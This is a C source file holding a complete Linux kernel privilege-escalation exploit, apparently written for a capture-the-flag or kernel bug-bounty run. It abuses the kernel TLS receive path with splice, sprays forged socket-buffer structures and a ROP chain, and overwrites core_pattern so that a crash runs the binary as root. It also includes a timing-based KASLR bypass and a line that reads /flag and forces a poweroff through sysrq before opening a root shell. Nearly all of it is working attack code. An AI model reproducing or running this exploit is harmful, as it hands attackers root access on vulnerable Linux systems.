#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <pthread.h>
#include <linux/if_alg.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <err.h>
#include <linux/tls.h>
#include <linux/vm_sockets.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define PAUSE           \
{                   \
	int x;          \
	printf(":");    \
	read(0, &x, 1); \
}

#define SYSCHK(x) ({              \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
		__res;                        \
		})

#define PAUSE           \
{                   \
	int x;          \
	printf(":");    \
	read(0, &x, 1); \
}
#define PORT 4444

uint64_t stext = 0;
int vsock_bind(unsigned int cid, unsigned int port, int type)
{
	struct sockaddr_vm sa = {
		.svm_family = AF_VSOCK,
		.svm_cid = cid,
		.svm_port = port,
	};

	int fd = SYSCHK(socket(AF_VSOCK, type, 0));
	SYSCHK(bind(fd, (struct sockaddr *)&sa, sizeof(sa)));

	return fd;
}
int vsock_connect_fd(int fd, unsigned int cid, unsigned int port)
{
	struct sockaddr_vm sa = {
		.svm_family = AF_VSOCK,
		.svm_cid = cid,
		.svm_port = port,
	};
	int ret;

	do
	{
		ret = connect(fd, (struct sockaddr *)&sa, sizeof(sa));

	} while (ret < 0 && errno == EINTR);

	return ret;
}


void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

int listen_vsockfd = -1;
struct sockaddr_vm listen_vsock_addr;

int vsock_pair(int fd[2]) {
	if(listen_vsockfd == -1) {
		int fd = vsock_bind(VMADDR_CID_ANY, VMADDR_PORT_ANY, SOCK_STREAM);
		printf("fd %d\n", fd);
		SYSCHK(listen(fd,1));
		int alen = sizeof(listen_vsock_addr);
		SYSCHK(getsockname(fd, (struct sockaddr *)&listen_vsock_addr, &alen));
		listen_vsockfd = fd;
	}
	int client = SYSCHK(socket(AF_VSOCK, SOCK_STREAM, 0));
	vsock_connect_fd(client, listen_vsock_addr.svm_cid, listen_vsock_addr.svm_port);
	int serv = SYSCHK(accept(listen_vsockfd,0,0));
	fd[0] = client;
	fd[1] = serv;
}

void setup_tls(int sock) {
	struct tls12_crypto_info_aes_ccm_128 crypto = {0};
	crypto.info.version = TLS_1_2_VERSION;
	crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;
	SYSCHK(setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")));
	SYSCHK(setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)));
}

struct
{
	long mtype;
	char mtext[0x2000];
} msg;

int msqid[0x4000];

int cfd[0x100][0x2];

char buf[0x100000];
char *addrs[0x1000];
int sprayfd[0x100][0x2];

#define WRITE_RANDOM_THREADS 10
#define WRITE_RANDOM_SIZE 0x100000ul
int random_fd;
int write_random_cfd[2];
char random_data[WRITE_RANDOM_SIZE];

void *write_random_job(void *dummy)
{
	set_cpu(1);

	write(write_random_cfd[0], buf, 1);
	read(write_random_cfd[0], buf, 1);
	while(1) {
//		write(random_fd, random_data, 0x10);
		write(random_fd, random_data, WRITE_RANDOM_SIZE);
	}
	sleep(-1);
}

pthread_t tid;
void setup_write_random()
{

	SYSCHK(random_fd = open("/dev/random", O_WRONLY));

	socketpair(AF_UNIX, SOCK_STREAM, 0, write_random_cfd);

	for (int i = 0; i < WRITE_RANDOM_THREADS; i++) {
		pthread_create(&tid, 0, write_random_job, NULL);
	}

	read(write_random_cfd[1], buf, WRITE_RANDOM_THREADS);
}

void test() {
	char buft[0x40];
	memset(buft,'A',0x10);
	memset(buft+0x10,'B',0x10);
	memset(buft+0x20,'C',0x10);
	memset(buft+0x30,'D',0x10);
	setup_write_random();
	for(int i=0;i<WRITE_RANDOM_SIZE;i+=0x40) {
		memcpy(random_data+i,buft,0x40);
	}
	write(write_random_cfd[1], buf, WRITE_RANDOM_THREADS);
	usleep(500);
	PAUSE;
	exit(0);
}

int exploit(int port) {
	int listener, conn, client;
	//test();
	char *core =
		(void *)mmap((void *)0xa00000, 0x2000, PROT_READ | PROT_WRITE,
					 MAP_PRIVATE | MAP_FIXED | MAP_ANON, -1, 0);
	// setup core_pattern payload that will execute /proc/pid/fd/666
	// which we already prepare before
	strcpy(core,
		   "|/proc/%P/fd/666 %P"); // put payload string into 0xa00000 which will used by ROP gadget

	int sock = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "aead",
		.salg_name = "cryptd(ccm(aes))",
	};
	char *maddr = (void *)0x200000;
	for (int i = 0; i < 0x100; i++)
		addrs[i] = SYSCHK(mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));

	for(int i = 0;i < 0x40; i++) {
		socketpair(AF_UNIX, SOCK_STREAM, 0, sprayfd[i]);
	}

	printf("bind %d\n",bind(sock, (struct sockaddr *)&sa, sizeof(sa)));
	struct sockaddr_in addr = {0};
	socklen_t len = sizeof(addr);

	//struct sockaddr_in6 addr = {0};
	//socklen_t len = sizeof(addr);

	set_cpu(0);

	// === Setup listener ===
	listener = socket(AF_INET, SOCK_STREAM, 0);
	if (listener < 0) { perror("socket listener"); exit(1); }

	//    addr.sin6_family = AF_INET;
	//    addr.sin6_port   = htons(PORT);
	//    addr.sin6_addr   = in6addr_loopback; // ::1
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("bind"); exit(1);
	}
	if (listen(listener, 1) < 0) {
		perror("listen"); exit(1);
	}

	// === Setup client and connect immediately ===
	client = socket(AF_INET, SOCK_STREAM, 0);
	if (client < 0) { perror("socket client"); exit(1); }

	if (connect(client, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("connect"); exit(1);
	}

	printf("[*] Client connected to server\n");

	// === Accept on server side (non-blocking because client already connected) ===
	conn = accept(listener, NULL, 0);
	if (conn < 0) {
		perror("accept"); exit(1);
	}
	printf("[*] Server accepted connection\n");
	for(int i=0;i<0x100;i++){
		cfd[i][0] = socket(AF_INET, SOCK_STREAM, 0);
		SYSCHK(connect(cfd[i][0], (struct sockaddr*)&addr, sizeof(addr)));
		cfd[i][1] = SYSCHK(accept(listener, NULL, 0));
		//vsock_pair(cfd[i]);
	}

	int dummy_serv = socket(AF_INET, SOCK_STREAM, 0);
	connect(dummy_serv, (struct sockaddr *)&addr, sizeof(addr));
	int dummy_cli = accept(listener, 0, 0);

	// === Setup TLS on both ends ===
	if(fork() == 0) {
		set_cpu(0);
		int n = recv(conn, buf, 0x10000, MSG_WAITALL);
		printf("still read waitall? %d\n", n);
		//DumpHex(buf, n);
		exit(0);
	}

	usleep(1000);
	setup_tls(conn);   // server end //setup_tls2(client);   // client end

	unsigned char tls_record[] = {
		0x17, 0x03, 0x03, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x26, 0xa2, 0x33, 0xde, 0x8d, 0x94, 0xf0, 0x29, 0x6c, 0xb1, 0xaf,
		0x6a, 0x75, 0xb2, 0x93, 0xad, 0x45, 0xd5, 0xfd, 0x03, 0x51, 0x57, 0x8f,
		0xf9, 0xcc, 0x3b, 0x42};

	int pfd[2];
	pipe(pfd);
	int n;
	for(int i=0;i<0x100;i++)
		for(int j=0;j<0x10;j++)
			write(cfd[i][1],buf,1);
	n = write(client, tls_record, sizeof(tls_record));
	printf("write %d\n", n);
	usleep(100);
	//PAUSE;
	write(pfd[1],buf,0x800);

	n = splice(pfd[0],0,client,0,0x300,0);
	//write(dummy_cli, buf, 1);

	for(int i=0;i<0x100;i++)
		for(int j=0;j<0x10;j++)
			write(cfd[i][1],buf,1);

	printf("write %d\n", n);

	char* ro = SYSCHK(mmap(NULL, 0x100000, PROT_READ, MAP_SHARED|MAP_ANONYMOUS, -1, 0));

	n = recv(conn, ro, 0x100000, 0); // fill rxm->full_len by early return 
	printf("still read2? %d\n", n);
	wait(NULL); // child exit at this point
	usleep(100);

	for(int i=0;i<0x100;i++)
		for(int j=0;j<0x10;j++)
			close(cfd[i][0]);

	for(int i=0;i<0x100;i++)
		for(int j=0;j<0x10;j++)
			close(cfd[i][1]);

	printf("start spray\n");
	memset(buf,0x0,0x10000);


//#define BSS_START 0xffffffff8510c000UL
//#define INPUT_POOL 0xffffffff843259b0UL
// 

#define BSS_START 	(stext + 0xffffffff8519c000UL - 0xffffffff81000000UL)
#define INPUT_POOL 	(stext + 0xffffffff843427b0UL - 0xffffffff81000000UL)
#define TEST 		(stext + 0xffffffff81dd6009UL - 0xffffffff81000000UL) // : 0xffffffff81dd6009 : call qword ptr [rdi + 0x31] ; call qword ptr [rcx + 0x48]
#define TEST4 		(stext + 0xffffffff823617d1UL - 0xffffffff81000000UL) // : mov rcx, rdi ; mov rax, rcx ; jmp 0xffffffff8276c1f0
#define TEST5		(stext + 0xffffffff820fc1efUL - 0xffffffff81000000UL) // : add rsp, 0x58 ; jmp 0xffffffff8276c1f0
#define TEST6		(stext + 0xffffffff81cbcf8fUL - 0xffffffff81000000UL) // : push rax ; pop rsp ; add ecx, dword ptr [rax - 0x39] ; ret
#define TEST11 		(stext + 0xffffffff81ddd06cUL - 0xffffffff81000000UL) // : and al, 0x31 ; call qword ptr [rax + 0x41] 
#define POP 		(stext + 0xffffffff810ff7fdUL - 0xffffffff81000000UL) // : pop rdi ; pop rsi ; pop rdx ; pop rcx ; jmp 0xffffffff8276c1f0
#define POP_RDI 	(stext + 0xffffffff8116c005UL - 0xffffffff81000000UL) // : pop rdi ; ret
									      //
#define COPY_FROM_USER 	(stext + 0xffffffff81b62c80UL - 0xffffffff81000000UL)
#define MSLEEP 		(stext + 0xffffffff8126de80UL - 0xffffffff81000000UL)
#define CORE_PATTERN 	(stext + 0xffffffff8420abe0UL - 0xffffffff81000000UL)

#define SKB_LEN 112
#define SKB_DATALEN 116
#define SKB_DATA 200
#define SKB_HEAD 192
#define SKB_END 188
#define SKB_USERS 212
#define SKB_FCLONE 126
#define SKB_EXT 216
#define SKB_NFCT 104
#define SKB_FCLONE_REF ((0xe0+0xe0+0xe0)-0x200)

	*(int*)(&buf[SKB_LEN]) = 272+13;
	*(int*)(&buf[SKB_DATALEN]) = 0;
	*(size_t*)(&buf[SKB_DATA]) = BSS_START;
	*(size_t*)(&buf[SKB_HEAD]) = INPUT_POOL;
	*(size_t*)(&buf[SKB_USERS]) = 2;
	*(size_t*)(&buf[SKB_NFCT]) = BSS_START;
	*(int*)(&buf[SKB_END]) = 0;
	*(char*)(&buf[SKB_FCLONE]) = 1<<2; // FCLONE_ORIG
	*(char*)(&buf[SKB_FCLONE_REF]) = 1;
	memcpy(&buf[0xe0],buf,0xe0);

	*(size_t*)&buf[0xe0+0x80] = POP;
	*(size_t*)&buf[0xe0+0x88] = CORE_PATTERN;
	*(size_t*)&buf[0xe0+0x90] = 0xa00000;
	*(size_t*)&buf[0xe0+0x98] = 0x20;
	*(size_t*)&buf[0xe0+0xa0] = 0x414141410;
	*(size_t*)&buf[0xe0+0xa8] = COPY_FROM_USER;
	*(size_t*)&buf[0xe0+0xb0] = MSLEEP;

	*(size_t*)&buf[0x100] = TEST5; // : add rsp, 0x58 ; jmp 0xffffffff8276c1f0

	*(size_t*)&buf[0x141] = TEST6; // : push rax ; pop rsp ; add ecx, dword ptr [rax - 0x39] ; ret
	*(size_t*)&buf[(0xe0+0x31)&0x1ff] = TEST4;
	*(size_t*)&buf[(0xe0+0x48)&0x1ff] = TEST11;


	for(int i=1;i<(0x2000/0x200);i++)
		memcpy(buf+i*0x200, buf, 0x200);

	for(int i = 0; i<0x40;i++) {
		send(sprayfd[i][0],buf,0x2000,0);
		send(sprayfd[i][1],buf,0x2000,0);
	}
	printf("reclaimed?\n");
	//read(pfd[0],buf,0x600);
	
	n = recv(conn, buf, 0x100000, 0); 
	printf("still read2 finish? %d\n", n);

	printf("exiting\n");
	exit(0);

	return 0;
}

int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	// send our binary to memfd for core_pattern payload
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	// our binary now at file descriptor 666
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

int bypass_kaslr(u64 base);
int main(int argc, char** argv) {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	if (argc > 1)
	{
		// #define SYS_pidfd_getfd 438
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag;echo o>/proc/sysrq-trigger");
		execlp("bash", "bash", NULL);
	}
	if (fork() == 0) // this process is used to trigger core_pattern exploit
	{
		set_cpu(1);
		setsid();
		crash("");
	}
	stext = bypass_kaslr(0)/*-0x30a0000UL*/;
	printf("got stext %zx\n", stext);
	char shinfo[0x40] = {0};
	*(char*)&shinfo[0] = 0xf;
	*(size_t*)&shinfo[0x8] = TEST;
	*(int*)&shinfo[0x10] = 1;
	*(size_t*)&shinfo[0x18] = INPUT_POOL+8;
	*(int*)&shinfo[0x20] = 1;
	*(size_t*)&shinfo[0x28] = INPUT_POOL+0x18;
	*(char*)&shinfo[0x30] = 1;
	*(size_t*)&shinfo[0x38] = INPUT_POOL+8;
	for(int i=0;i<WRITE_RANDOM_SIZE;i+=0x40) {
		memcpy(&random_data[i],shinfo,0x40);
	}

	sleep(1);
	setup_write_random();
	write(random_fd, random_data, 0x20);
	write(write_random_cfd[1], buf, WRITE_RANDOM_THREADS);
	for(int i=0;i<0x100;i++) {
		if(fork() == 0) {
			exploit(4444+i);
		}
		wait(NULL);
		usleep(100);
	}
}


inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile(
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}


void prefetch(void* p)
{
  asm volatile (
    "prefetchnta (%0)\n"
    "prefetcht2 (%0)\n"
    : : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
  size_t time = rdtsc_begin();
  prefetch(addr);
  size_t delta = rdtsc_end() - time;
  return delta;
}


int bypass_kaslr(u64 base) {
    if (!base) {
      #ifdef KASLR_BYPASS_INTEL
        #define OFFSET 0
        #define START (0xffffffff81000000ull + OFFSET)
        #define END   (0xffffffffD0000000ull + OFFSET)
	#define STEP   0x0000000001000000ull
        while (1) {
            u64 bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    u64 addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                    if (times[ti] < minv) {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0) {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (c == 0) {
                base = bases[i];
              } else if (base == bases[i]) {
                c++;
              } else {
                c--;
              }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (base == bases[i]) {
                c++;
              }
            }
            if (c > ARRAY_LEN(bases) / 2) {
              base -= OFFSET;
              goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);

        }
      #else
        #define START (0xffffffff81000000ull)
        #define END (0xffffffffc0000000ull)
        #define STEP 0x0000000000100000ull
        #define NUM_TRIALS 9
        // largest contiguous mapped area at the beginning of _stext
        #define WINDOW_SIZE 11

        while (1) {
            u64 bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    u64 addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++) {
                        sum += times[ti + i];
                    }
                    if (sum > max) {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (c == 0) {
                base = bases[i];
              } else if (base == bases[i]) {
                c++;
              } else {
                c--;
              }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (base == bases[i]) {
                c++;
              }
            }
            if (c > ARRAY_LEN(bases) / 2) {
              goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
      #endif
    }

got_base:

    printf("using kernel base %llx\n", base);


    return base;
}
